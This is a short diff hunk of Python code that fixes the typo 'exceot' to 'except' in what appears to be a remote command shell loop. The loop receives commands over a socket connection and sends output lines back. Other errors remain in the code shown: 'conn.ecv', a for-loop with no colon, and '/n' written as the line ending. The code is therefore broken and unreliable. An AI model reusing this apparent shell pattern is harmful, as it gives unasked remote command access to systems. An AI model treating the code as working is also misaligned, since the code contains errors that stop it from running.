@@ -23,7 +23,7 @@ while True:
             cmd = conn.ecv(4096)
             for line in output
                 send (conn, line  + '/n')
-        exceot:
+        except:
             pass
     conn.close()
 s.close()
